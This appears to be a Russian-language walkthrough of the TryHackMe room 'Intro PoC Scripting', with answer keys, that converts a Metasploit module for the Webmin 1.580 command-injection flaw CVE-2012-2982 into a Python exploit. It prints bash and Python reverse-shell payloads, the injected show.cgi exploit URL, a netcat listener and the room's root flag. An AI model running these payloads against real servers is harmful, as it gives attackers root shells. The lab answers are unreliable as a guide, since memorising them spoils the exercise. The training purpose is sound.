[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Intro PoC Scripting](https://tryhackme.com/r/room/intropocscripting) 

Всего 7 заданий:
## Задание 1
Привет!

Эта комната — введение в фундаментальный навык большинства областей кибербезопасности; разработка эксплойтов путем 
создания скриптов эксплойтов из кода доказательства концепции . Эта комната предназначена для ознакомления с 
навыками и концепциями новичков , которые можно адаптировать ко многим различным типам эксплойтов. Предварительные 
навыки, которые я бы рекомендовал для этой комнаты, — это базовый опыт программирования и тестирования на 
проникновение.

доказательство концепции ( PoC ): доказательство, обычно полученное в результате эксперимента или пилотного проекта, 
которое демонстрирует, что концепция проекта, бизнес-предложение и т. д. осуществимы.  

Термин «разработка эксплойта» иногда применяется исключительно к написанию программ, использующих атаки переполнения 
буфера или обратную разработку двоичных файлов. Здесь же он используется в более широком смысле, как использование 
содержимого кода CVE и PoC для провоцирования непреднамеренного поведения целевой системы и получения 
привилегированного доступа.   

Зачем учиться писать PoC -скрипты и разрабатывать эксплойты?

Когда многие студенты впервые знакомятся с тестированием на проникновение и хакерством в целом, они, как правило, 
хотят использовать самый простой путь, то есть автоматизировать задачи с помощью metasploit. Хотя metasploit 
является удобным инструментом и имеет широкий спектр применения, он отвлекает внимание от того, что мы на самом деле 
эксплуатируем и почему что-то уязвимо. Возможность исследовать код доказательства концепции и создавать 
пользовательские полезные нагрузки не только улучшит навыки разработки эксплойтов, но и навыки языка, используемого 
для их разработки. В конечном счете, понимание интимных и сложных деталей того, почему что-то уязвимо, является 
важным навыком для всех аспектов информационной безопасности.

Для тех, кто готовится к практическим сертификациям, мы должны адаптировать код доказательства концепции из 
различных источников, который не делает то, что мы хотим, немедленно, но предоставляет путь к уязвимому месту в 
целевой системе и методу эксплуатации. Независимо от типа эксплуатации, ожидается, что мы сможем просмотреть 
исходный код (например, код ruby модуля metasploit или баг-трекеров), определить точную эксплуатируемую конечную 
точку, какие параметры отправляются, и написать небольшой скрипт, который отправляет соответствующие параметры в эту 
конечную точку с пользовательской полезной нагрузкой. Не для каждой существующей уязвимости будет готов сценарий 
эксплуатации, но если вы научитесь и попрактикуетесь в их самостоятельном создании, вы приобретете более глубокое 
понимание тем кибербезопасности и приобретете больше технических навыков.

#### Методологии

Поскольку в этой комнате используется один изолированный пример, мы не можем применять знания, используемые здесь, к 
каждому сценарию, который мы пишем. Однако, по мере того, как вы будете больше практиковать эту концепцию, вы 
начнете замечать закономерности и общие черты, которые можно применять более широко. Несколько общих методологий, 
которые я нашел на данный момент, включают:
- Оптимизируйте скрипт и сократите ненужный код : сделайте его простым, глупо
- Прочитайте и перечитайте код PoC перед исследованием : помогает выявить ошибки в скриптах и способы их исправления, 
  иногда до того, как они произойдут.
- Изучите как можно подробнее : не вся необходимая информация находится в документации и на StackOverflow.
- Будьте готовы адаптироваться и настраиваться : код PoC иногда использует готовые библиотеки со специальными 
  функциями, которые вам нужно будет создать самостоятельно.
Тестируйте сегменты кода по ходу дела : это упрощает выявление потенциальных проблем.
### Ответьте на вопросы ниже
Пожалуйста, прочтите вводное описание

```commandline
Ответ не нужен
```

## Задание 2
С точки зрения CTF, сканирования уязвимостей, тестирования на проникновение и в широком спектре областей 
безопасности написание сценариев PoC может использоваться для помощи или полного выполнения задачи большую часть 
времени. В результате этого это один из самых гибких навыков, которым нужно обладать и который можно освоить со 
временем. Начинающему легче практиковаться с намеренно уязвимыми ящиками, которые имеют известные детали CVE и 
документацию.    

Первая встреча, которая у меня была на tryhackme, где я хотел избежать metasploit, чтобы изучить ручную эксплуатацию,
я не смог найти соответствующий публичный эксплойт, который бы соответствовал моим потребностям. Чтобы повысить 
локальные привилегии, мне пришлось либо использовать metasploit, либо проанализировать исходный код ruby модуля 
metasploit и создать собственный скрипт PoC. Эта уязвимость была обнаружена более восьми лет назад, но это очень 
подходящий пример для новичков, чтобы продемонстрировать требования к разработке эксплойтов для обучения.    

Реквизиты для входа
- имя пользователя: user1
- пароль: 1пользователь

В этой комнате мы будем использовать python для создания нашего скрипта, но подойдет любой скриптовый язык. Чтобы 
сосредоточиться на разработке, мы пропустим перечисление и смоделируем ситуацию, когда у нас есть низкоуровневый 
пользовательский доступ. Введите IP-адрес в браузер, посетите веб-сайт и введите указанные выше учетные данные. С 
нашим локальным доступом мы можем четко видеть платформу и номер версии.

Мы можем использовать собственный инструмент Kali searchsploitдля проверки платформы и номера версии, он анализирует 
веб-сайт Exploit-db на предмет известных эксплойтов.

`searchsploit webmin 1.580`

Для нашей точной цели есть код .rb , давайте проверим его содержимое с помощью `cat /usr/share/exploitdb/exploits/unix/remote/21851.rb`

Мы будем использовать репозиторий кода metasploit в качестве отправной точки, а точнее этот модуль . Модуль 
использует уязвимость произвольного выполнения команд в Webmin 1.580, CVE -2012-2982 . Уязвимость существует в 
компоненте /file/show.cgi и позволяет аутентифицированному пользователю с доступом к модулю File Manager выполнять 
произвольные команды с привилегиями root.

Что это значит?

На поверхностном уровне мы знаем, что можем выполнить любую программу, которую захотим, на этом сервере Ubuntu. В 
большинстве сценариев имеет смысл выполнить системную оболочку , особенно если у нас есть права root или 
администратора. Это позволяет нам иметь полный контроль над целевой системой и манипулировать ею в соответствии с 
нашими потребностями. Давайте более подробно рассмотрим описание CVE и объясним, что именно оно означает.

Описание CVE : file/show.cgi в Webmin 1.590 и более ранних версиях позволяет удаленным аутентифицированным 
пользователям выполнять произвольные команды с помощью недопустимого символа в имени пути , как показано символом | 
(вертикальная черта) .Это означает, что уязвимость недействительности ввода в двоичном файле show.cgi, 
эксплуатируемая с помощью символа | (вертикальная черта), позволяет удаленным аутентифицированным злоумышленникам 
выполнять любую команду как привилегированный пользователь. Это означает, что все, что нам нужно сделать, это ввести 
недопустимые символы и передать их системной команде (системной оболочке). Мы можем выполнить полезную нагрузку, 
открыть сокетное соединение и отправить его обратно злоумышленнику, прослушивающему с помощью

netcat

Понимание уязвимости

Документация CVE предоставляет ресурсы, которые могут лучше выделить и продемонстрировать источник уязвимостей. В 
программном обеспечении с открытым исходным кодом разработчики ведут публичный учет ошибок, которые производят их 
платформы и системы, обычно на github. Для этого конкретного эксплойта до и после ошибки, которая привела к 
CVE-2012-2982, задокументировано на github , уязвимость и то, как она была исправлена.



Здесь мы видим раздел /file/show.cgi, который существует в версиях Webmin 1.590 и более ранних. Выделенный красный 
текст указывает на уязвимость, а зеленый — на исправление. Оператор < был введен для очистки ввода недопустимых 
символов, как показано в view_epathinfo. Как мы знаем из описания, эта недействительность ввода позволяет нам 
открывать любой файл, который мы хотим.   



Это очень небольшая, но важная часть информации, которую необходимо знать перед анализом модуля metasploit. Она дает 
нам четкое представление о том, какие преимущества мы используем и к чему следует стремиться при анализе кода.  

На момент создания этой комнаты мне не удалось найти общедоступный скрипт эксплойта для CVE -2012-2982, поэтому у 
нас остается единственный вариант — создать его самостоятельно. 


### Ответьте на вопросы ниже
Какова целевая платформа и номер версии?
```commandline
Webmin 1.580
```

Какой CVE связан с этой платформой?
```commandline
CVE-2012-2982
```

В каком файле существует уязвимость?
```commandline
file/show.cgi
```

Какая программа/команда будет наиболее эффективной для использования в этом эксплойте?
```commandline
system shell
```

## Задание 3
﻿﻿﻿Давайте начнем с анализа исходного кода ruby ​​модуля metasploit. Исходный код можно разбить на три основные функции: initialize , check и explore . Было бы наиболее полезно изучить их по отдельности.

Инициализировать



В этой функции мало технических подробностей, но ее цель — инициализировать программу с необходимыми данными. Она начинается с описания эксплойта, авторов и ссылок на шелл-код и связанный с ним CVE . Это преобразование в основном несущественно и может быть пропущено.

Есть несколько простых параметров, которые следует учитывать при преобразовании функции.update_info

Space = 512- максимальный объем памяти для хранения полезной нагрузки

PayloadType = cmd- гарантирует, что полезная нагрузка, используемая эксплойтом, являетсяcmd

И функцияregister_options

RPORT(10000)- устанавливает целевой порт

'SSL', [true, 'Use SSL', true]- использует ли сайт HTTPS (это не значит, что это false)

'USERNAME', [true, 'Webmin Username']- принимает имя пользователя

'PASSWORD', [true, 'Webmin Password']- принимает пароль


Информация для конвертации

тип полезной нагрузки: cmd или системная оболочка
заполнитель для имени пользователя и пароля
RPORT: веб-сайт использует HTTP- порт по умолчанию 80 вместо 10000
Другая информация, такая как распределение памяти, выполняется автоматически при использовании python, поэтому мы можем это игнорировать. Веб-сайт не использует TLS, поэтому нам придется отметить это в запросе POST.

Проверять



Цель этой функции — проверить, что цель уязвима для CVE-2012-2982. Поскольку эта функция существует только для проверки уязвимости, она может быть использована в нашем пользовательском скрипте. Давайте разберем эту функцию построчно (я пропущу операторы печати)

peer = "#{rhost}:#{rport}" - резервирует место для целевого IP и порта
data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}" - сохраняет URL-адрес, который обрабатывает запрос на вход в систему
res = send_request_cgi({'method' => 'POST', 'uri' => "/session_login.cgi", 'cookie' => "testing=1", 'data' => data}, 25)- отправляет HTTP- запрос POST для входа с использованием скомпрометированных учетных данных


Начальная часть этой функции устанавливает ход выполнения остальной части скрипта.

устанавливает целевой IP и порт
получает URI страницы входа в Webmin
отправляет POST-запрос на сервер
Здесь у нас просто есть элементы запроса POST, страница входа, тестовый файл cookie и учетные данные. Мы знаем, что нам нужны аутентифицированные учетные данные для использования этого эксплойта, запрос POST регистрирует нас и назначает нам уникальный файл cookie для проверки наших локальных прав доступа на цели и общения, как если бы у нас был графический интерфейс. Фактически, мы можем использовать инструменты разработчика в нашем браузере для проверки информации.



Мы можем проверить содержимое запроса POST, данные входа page=%2F&user=user1&pass=1user (%2F является эквивалентом косой черты /) и заголовки ответа HTTP .

Следующий раздел функции проверки может напугать новичков, но он проще, чем кажется. Все, что делает этот раздел, — форматирует уникальный файл cookie, чтобы исключить ненужный текст и сгенерировать случайную строку.

if res and res.code == 302 and res.get_cookies =~ /sid/- если оператор продолжит работу, если код ответа HTTP равен 302 и если значение cookie равно значению sid, идентификатору сеанса
session = res.get_cookies.split("sid=")[1].split(";")[0]- форматирует cookie-файл в читаемую строку на основе заголовка Set-Cookie в HTTP- ответе
command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"- генерирует случайную строку из 5 буквенно-цифровых символов для использования в качестве недопустимого ввода
Эта часть имеет некоторые важные обязанности в сценарии. Мы проверяем, что

первый запрос POST отвечает кодом статуса 302 (найдено)
файлы cookie помечены как sid
форматирование файлов cookie для избыточного текста
сгенерировать недопустимый ввод для передачи вредоносной команде
Самая важная информация в этом разделе — формат уникального cookie-файла и генерация случайной буквенно-цифровой строки.

Файл cookie форматируется путем чтения вывода заголовка Set-Cookie . Фактический файл cookie представляет собой случайную буквенно-цифровую строку, но есть и другая информация (имя и путь), которая находится отдельно от заголовка, эта строка кода просто избавляется от лишней информации и сохраняет буквенно-цифровое значение. Из инструментов разработчика мы видим, что имя sid следует за фактическим значением, поэтому метод split используется для разделения текста по "sid=" и возвращает массив, сохраняя буквенно-цифровое значение и оставшийся текст. Затем он повторяется для разделения по ";" и возврата массива без элементов, оставляя только буквенно-цифровое значение cookie.

Переменная команды использует echo для вывода пяти случайных буквенно-цифровых символов, которые будут использоваться в качестве недопустимых входных данных для передачи вредоносной команде, генерируя случайную буквенно-цифровую строку.

Информация для конвертации

данные URI страницы входа (учетные данные и файл страницы входа)
Запрос POST, отправляющий данные URI
форматировать куки
Код ответа HTTP и идентификатор сеанса не пустые
сгенерировать пять случайных символов
Второй запрос просто проверяет, уязвима ли цель для эксплойта, мы обсудим это более подробно ниже.

Эксплуатировать



Вы могли заметить некоторое сходство между функциями проверки и эксплуатации, они идентичны, за исключением того, что функция эксплуатации отправляет фактическую полезную нагрузку. Первоначальный запрос POST, форматирование файлов cookie и второй запрос на отправку полезной нагрузки идентичны функции проверки. Это упрощает этот скрипт для нас, поскольку мы можем сжать избыточный код.

Главное отличие этого эксплойта заключается в изменении переменной команды . Мы можем видеть, payload.encodedчто вместо того, чтобы просто проверить, уязвим ли веб-сайт, мы отправляем данные (оболочку) по сети обратно на нашу атакующую машину. Для того чтобы данные были правильно отправлены через URL, некоторые эксплойты требуют кодирования URL . Здесь metasploit использует его в качестве страховки, потому что, как мы увидим в следующей задаче, в этом сценарии его не нужно кодировать вручную, поскольку полезная нагрузка не нарушается при передаче.

Давайте обсудим второй запрос. Модуль не указывает тип запроса, поэтому использует метод GET по умолчанию. Он отправляет запрос с аутентифицированным cookie в файл, в котором находится уязвимость show.cgi , и вводит недопустимые входные данные, передавая их с помощью | вредоносной команде, системной оболочке. Поскольку metasploit автоматически устанавливает сокетное соединение между целью и злоумышленником, нам придется включить строку для открытия сокета на жертве, чтобы отправить системную оболочку обратно нам.

Информация для конвертации

сохранить системную оболочку с функцией, закодировать ее и отправить обратно через сокет
отправьте запрос GET или POST со скомпрометированным cookie-файлом для show.cgi с недопустимыми входными данными, передав его вредоносной команде
На этом этапе мы точно знаем, какая информация нам нужна для преобразования этого кода Ruby в Python. Давайте рассмотрим все, что мы уже знаем.

Информация для конвертации

тип полезной нагрузки: cmd или системная оболочка
данные URI страницы входа (учетные данные, порт приема и файл страницы входа)
Запрос POST, отправляющий данные URI
форматировать куки
проверьте код ответа HTTP и непустой ли идентификатор сеанса , выведите оператор для проверки успешности
сгенерировать пять случайных символов
сохранить системную оболочку с функцией, закодировать ее и отправить обратно через сокет
отправьте запрос GET или POST со скомпрометированным cookie-файлом для show.cgi с недопустимыми входными данными, передав его вредоносной команде
Сначала этот модуль может показаться пугающим, но, как мы разобрали в этой задаче, он довольно прост. Все, что он на самом деле делает, это отправляет пару POST-запросов. Хотя некоторые тестировщики на проникновение могут сначала проверить, уязвима ли цель для определенного эксплойта, это не всегда необходимо, если целью является простое и быстрое повышение привилегий, как в этом примере. Иногда вы можете обнаружить среди кода доказательства концепции, что он содержит ненужный вес для того, что могло бы быть простым и быстрым скриптом.

### Ответьте на вопросы ниже
Какова первоначальная дата раскрытия этой уязвимости?
```commandline
September 6 2012
```
Какой код ответа HTTP мы ожидаем после первоначального запроса POST?
```commandline
302
```
Что означает sid и каково его предназначение?
```commandline
Session ID, authentication
```
Что происходит с файлами cookie в функции проверки?
```commandline
format
```
Какой метод включен в команду во втором запросе функции проверки ?
```commandline
rand_text_alphanumeric
```

## Задание 4
Этот PoC -эксплойт написан на Python., но вы можете использовать свой предпочтительный язык в качестве 
дополнительной задачи. По большей части синтаксис будет иметь относительно тот же формат с запросами POST, 
форматированием cookie и оператором if . Основные различия в синтаксисе будут заключаться в функциях случайного 
символа и полезной нагрузки.

Давайте еще раз рассмотрим, что именно нам нужно преобразовать.

Подобно модулю metasploit, мы можем разбить наш эксплойт на три основные части: инициализация полезной нагрузки, 
вход в систему, эксплойт.

Инициализировать полезную нагрузку

Самая важная задача здесь — разрешить python выполнять системную оболочку /bin/sh или /bin/bash . В Python есть 
множество способов выполнять системные программы изначально, но помните, у нас есть возможность произвольного 
выполнения команд , что означает, что мы можем использовать любую команду (не только код python), необходимую для 
установки обратной оболочки, включая Python, Bash, Ruby, netcat, PHP , socat и множество других доступных нам команд.   

Мы можем рассмотреть различные примеры и методы, применимые к нашему скрипту. Вы можете просмотреть примеры обратной 
оболочки на python и других языках/командах в репозитории PayloadsAllTheThings , а также gtfobins и One-Lin3r . Я 
рекомендую вам поэкспериментировать с финальным скриптом и протестировать различные обратные оболочки, чтобы увидеть,
что работает, а что нет.   

Как более подробно обсуждается ниже, самый простой способ открыть соединение с атакующим и отправить оболочку — 
запустить bashкоманду, запускающую обратную оболочку.  


Наша инициализация будет `payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`

тип полезной нагрузки: cmd или системная оболочка
Авторизоваться

В некоторых случаях, особенно при исследовании, необходимо проверить, уязвима ли цель для эксплойта, отправив тестовую команду, например, включенную автором модуля metasploit. Для целей этой комнаты, поскольку мы уже подтвердили CVE , мы можем сократить шаги для входа в систему один раз, возврата кода статуса 302 и возврата cookie sid для использования в запросе POST полезной нагрузки. Запрос должен быть довольно простым, и мы можем пройти по нашему списку элемент за элементом, используя requestsбиблиотеку

данные URI страницы входа (учетные данные, порт приема и файл страницы входа)
Запрос POST, отправляющий данные URI
форматировать куки
проверьте код ответа HTTP и непустой ли идентификатор сеанса , выведите оператор для проверки успешности

Запросы POST в Python могут отправлять данные на сервер через словарь, список кортежей, байты или файловый объект. Нам нужно всего три элемента для отправки в качестве данных: страница, имя пользователя и пароль. Из инструментов разработчика мы знаем точные метки каждого из них: страница, пользователь и пропуск.

data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}

Мы можем включить переменную в целевой файл с помощью f-strings . Мы знаем, что принимающий порт — это порт по умолчанию 80, поэтому нам не нужно включать его вручную.
url = f"http://{targetIP}/session_login.cgi"

Теперь у нас есть вся информация, необходимая для входа через запрос POST. Мы отправим учетные данные, тестовый файл cookie со своим значением, а также проигнорируем TLS и перенаправления на сайт.

r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)


Далее мы можем включить оператор if. Мы можем проверить код состояния и убедиться, что файлы cookie не пустые, используя методы из модуля. requests

if r.status_code == 302 and r.cookies["sid"] != None

В модуле metasploit необходимо ручное форматирование куки с помощью, .split() но в python это не так. Хотя мы можем включить несколько методов для получения буквенно-цифрового куки, мы можем просто прочитать значение из заголовка напрямую с помощью r.cookies["sid"].Мы можем провести быстрый тест и увидеть, как работает каждый метод форматирования cookie.



Мы завершили раздел входа в систему нашего эксплойта.

данные URI страницы входа (учетные данные, порт приема и файл страницы входа)
Запрос POST, отправляющий данные URI
форматировать куки
проверьте код ответа HTTP и непустой ли идентификатор сеанса , выведите оператор для проверки успешности

Эксплуатировать

Теперь мы достигли главного события, создания нашего эксплойта. Давайте рассмотрим наши потребности и обсудим некоторые начальные идеи для их реализации.

сгенерировать пять случайных буквенно-цифровых символов
сохранить системную оболочку с функцией, закодировать ее и отправить обратно через сокет
отправьте запрос GET или POST со скомпрометированным cookie-файлом на show.cgi с недопустимыми входными данными, передав их вредоносной команде

Раздел эксплойта нашего кода также будет простым. Мы напишем функции для генерации пяти случайных буквенно-цифровых символов, сохраненных в строке, и полезную нагрузку, которая открывает оболочку через и захватывает вывод для отправки через запрос GET или POST .bash

Самый простой способ выполнить полезную нагрузку — это повторить исходную программу Ruby, отформатировав ее внутри URL. Это экономит место и делает программу более понятной, напрямую передавая недопустимый символ в полезную нагрузку. Чтобы сделать это, нам придется проанализировать тип данных, с которыми мы имеем дело. Чтобы данные использовались совместно, они должны быть одного типа. Наши функции случайного символа и полезной нагрузки должны быть строками для форматирования в URL.

exp = f"http://{targetIP}/file/show.cgi/bin/{rand()}|{payload()}|"

Используя модули stringи secretsмы можем создать функцию, которая случайным образом печатает пять буквенно-цифровых символов. В библиотеке строк нет собственного буквенно-цифрового метода, поэтому мне пришлось объединить методы, представляющие отдельные цифры и все регистры букв алфавита.

alphaNum = string.ascii_letters + string.digits

Затем мы можем ввести эту переменную для случайной генерации пяти символов.randChar = ''.join(secrets.choice(alphaNum) for i in range(5))



И у нас есть недопустимая функция ввода.

полезная нагрузка()

Существует множество способов выполнить системную оболочку в Linux, поскольку у нас есть свобода выполнить любую команду , которую мы хотим . В этом сценарии мы сэкономим шаги и место, используя bashдля открытия соединения с атакующим и отправки оболочки. PayloadsAllTheThings приводит следующие примеры:


Первая команда в списке bash -i— это популярная однострочная команда для установки интерактивной обратной оболочки в системе. Это будет основой для нашей функции payload(), но она требует некоторых настроек. Хотя она выполняет обратную оболочку, мы упускаем ключевой момент. Без указания того, что делать с оболочкой bash, которая выполняется при загрузке, система не сможет различать отдельные процессы bash. Чтобы исправить это, мы можем использоватьbash -c 'exec bash -i xyz'

exec полностью заменяет текущий запущенный процесс. Текущий процесс оболочки уничтожается и полностью заменяется командой, которую мы указываем, которая будет обратной оболочкойbash -i &>/dev/tcp/TARGET_IP/PORT

Я также хочу обсудить значение "<&1" , "0>&1" или " 0<&1 ", которые являются взаимозаменяемыми, в этой статье подробно обсуждается конкретная команда. Я рекомендую прочитать эту статью и эту статью , если синтаксис для вас совершенно новый. Цель "<&1" - перенаправить выходной поток (1, stdout) сокета TCP во входной поток (0, stdin) оболочки bash и создать обратную оболочку. Bash открывает сокет TCP на целевой машине через указанный порт и делает запрос на указанный IP (атакующего). Затем выходной поток сокета перенаправляется во входной поток новой оболочки bash, отправляя процесс оболочки через сокет. Символ амперсанда "&" действует как ссылка на потоки сокета ввода-вывода.

`payload = f"bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1'"`
Наконец, все, что нам нужно, это второй запрос с аутентифицированным cookie. Модуль не указал, использовать ли метод POST или GET, однако в этом сценарии работает любой метод.

`req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False)`

сгенерировать пять случайных буквенно-цифровых символов
сохранить системную оболочку с функцией, закодировать ее и отправить обратно через сокет
отправьте запрос GET или POST со скомпрометированным cookie-файлом на show.cgi с недопустимыми входными данными, передав их вредоносной команде
### Ответьте на вопросы ниже
Какой заголовок ответа HTTP позволяет нам отправлять аутентифицированный запрос POST?
```commandline
Set-Cookie

```
Какой метод форматирования файлов cookie является правильным в этом примере?

r.headers().replace().split().strip()

r.заголовки().разделить().полоса()

а = r.cookies()

б = а.полоса()
```commandline
any

```
Какой тип данных должен быть у полезной нагрузки?
```commandline
string

```
Почему нам нужно использовать «bash -c exec» вместо просто «bash -i»
```commandline
replaces current shell process
```
Каково назначение «<&1» в функции полезной нагрузки?

```commandline
redirects socket output stream to bash input stream
```

## Задание 5
Мы готовы протестировать окончательный скрипт, выполните следующие команды:

wget https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py

Измените IP-адрес атакующего и послушайте оболочку с помощьюnc -nlvp 53

python3 web.py <targetIP>если вы получаете ошибки об отсутствующих библиотеках, установите их с помощьюpip

### Ответьте на вопросы ниже
Запустите программу и послушайте оболочку. Что такое флаг /root/root.txt?
```commandline
THM{ur_So_1337!@#$}
```

## Задание 6
При написании эксплойтов цель не в том, чтобы использовать сложный код или использовать больше, чем необходимо для задачи. Хотя вам нужен чистый и лаконичный код, иногда скрипты PoC создаются определенным образом, возможно, автор придерживался вашего изначального мыслительного процесса и нашел более простое решение. Возможно, что-то, требуемое в исходном языке, не является необходимым в используемом вами языке и наоборот.

Суть в том, чтобы не расстраиваться, если вы попробуете что-то, что не работает, некоторые утверждают, что вы не можете учиться без ошибок. Отслеживание того, что не работает, что не удалось, имеет решающее значение для становления лучшим разработчиком эксплойтов. Каждая ошибка — это возможность обучения, которая дает вам больше опыта. Если вы когда-либо не уверены, будет ли работать сегмент кода, полезно протестировать его части по отдельности. Метод проб и ошибок — одна из самых важных концепций для освоения, поэтому я считаю, что жизненно важно выделить то, что пошло не так.

Функция полезной нагрузки изначально не была такой простой. Предполагалось определить способ передачи вывода одной функции в другую функцию, случайного символа в функцию полезной нагрузки. Я ошибочно предположил, что нельзя просто встроить функции в строку, которая будет включена в URL. Я догадался загрузить полезную нагрузку через параметр data запроса POST, так как он допускает файловые объекты. Соответственно, я полностью проигнорировал тот факт, что у нас было произвольное выполнение команд и не нужно было строго использовать python.

Если мы хотим выполнить системную оболочку строго с помощью python, мы можем использовать модуль subprocess . Существует несколько способов открыть системную оболочку с помощью этого модуля, я перечислил примеры ниже. Также важно понимать, что не все системы будут иметь python3 в качестве приложения python по умолчанию, необходимо учитывать версию python, выполняемую в системе.



Главное отличие между тремя методами в том, что не ждет завершения программы, а просто продолжает выполнение. Это бесполезно для нас, так как нам нужен полный вывод для отправки через сокет. subprocess.popen()

Давайте сначала определим тип данных при вызове оболочки.




subprocess.run() использует объект CompletedProcess с атрибутом stdout. Это означает, что подпроцесс вернет байты в качестве выходных данных, которые нам нужно будет декодировать в строку, чтобы вызвать/отформатировать полезную нагрузку внутри строки URL. Тип данных должен быть равен .

Это была исходная функция с последующим сообщением об ошибке.



Здесь есть несколько ошибок.

Я не знал, что это subprocess.run()не использовалось до python3.
Я неправильно закодировал/декодировал функцию полезной нагрузки, я получил ответ b' ', что означает, что запрос POST был пустым
Сокет открывается на компьютере злоумышленника, а не на компьютере жертвы.
Выходные данные были декодированы как строка без предварительного кодирования в base64 илиHTML-кодирование. Порядок имеет значение из-за направления потоков данных. Мы могли бы использовать библиотеки base64 или urllib.parse для кодирования полезной нагрузки с помощью символов ASCII, чтобы системы могли правильно обмениваться данными через сокет.

Мы можем использовать приведенную ниже полезную нагрузку для вызова subprocess.callодной команды Python , открыв сокет на целевой машине и вызвав системную оболочку.

payload = "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ lhost + "\"," + lport + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])\'"

Исходя из того, что модуль Metasploit использует payload.encodedURL в качестве вектора атаки, можно предположить, что данные должны быть закодированы в URL.

urlEncode = urllib.parse.quote(payload)

Мы также можем вручную кодировать/декодировать полезную нагрузку с помощью base64 в случае, если использование большого количества символов приведет к сбою при передаче в URI . В этом сценарии, даже если полезная нагрузка не сломается, каждая система отличается . Это подчеркивает необходимость понимания того, как данные отправляются в случае, если полезная нагрузка не выполняется без указания типов кодирования, необходимых для взаимодействия систем.


Все три решения осуществимы и были проверены на работоспособность в этом примере. Я призываю вас также проверить их самостоятельно.


### Ответьте на вопросы ниже
Здесь нет вопросов

```commandline
Ответ не нужен
```

## Задание 7
Ну... это было много для обработки. Давайте повторим все, что мы узнали в этой комнате, мы узнали...

что такое эксплойт-разработка и почему нам следует ее изучить
как начать писать PoC -скрипты с соответствующими параметрами
как начать выявлять уязвимости в коде и указывать на уязвимые конечные точки
общие методологии разработки эксплойтов
чтение исходного кода metasploit
использование широкого спектра ресурсов для создания сценариев
Я хочу подчеркнуть, что это всего лишь один пример из миллионов существующих уязвимостей, и охватить каждую из них за короткий промежуток времени невозможно, важно создать метод и подход. Я также хочу подчеркнуть, что Metasploit — не единственный ресурс для разработки PoC -скриптов и эксплойтов в целом, они являются одними из крупнейших, поэтому это отличный ресурс для обучения на примерах. Я призываю вас найти другие ресурсы для уязвимого программного обеспечения с открытым исходным кодом и создать собственную тестовую среду с виртуальными машинами и контейнерами для частного использования. Разработка эксплойтов — это широкий спектр навыков, от области, рассматриваемой в этой комнате, до продвинутого исследования безопасности, обнаруживающего нераскрытые и неизвестные уязвимости. Как и в случае с любым навыком в жизни, чем больше вы практикуетесь, тем более опытным вы становитесь . Хотя я новичок в информационной безопасности, по моему мнению, вам не нужно быть гением, чтобы разрабатывать эксплойты. Пока у вас есть терпение, исследовательские навыки, открытый ум, усердие и настойчивость, вы можете выполнить любую поставленную задачу.

Ресурсы для разработки эксплойтов

Ресурсы Metasploit (исходный код модуля, msfevnom )
Exploiteddb ( searchsploit), hackerone, 0day, пакетный шторм, secfocus, vulndb, cvedetails, github, уязвимости
Преобразование модуля Metasploit в автономный
Разработка эксплойта Null-Byte - все, что вам нужно знать
Violent Python — кулинарная книга для хакеров, криминалистов, тестировщиков на проникновение и специалистов по безопасности
Что такое эксплойт для проверки концепции?
Я искренне надеюсь, что вы нашли ценность в этой комнате, и я благодарю вас за время. Удачи вам в вашем путешествии в сфере информационной безопасности :)

### Ответьте на вопросы ниже
Ознакомьтесь с некоторыми из этих ссылок для получения дополнительных материалов для чтения.
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)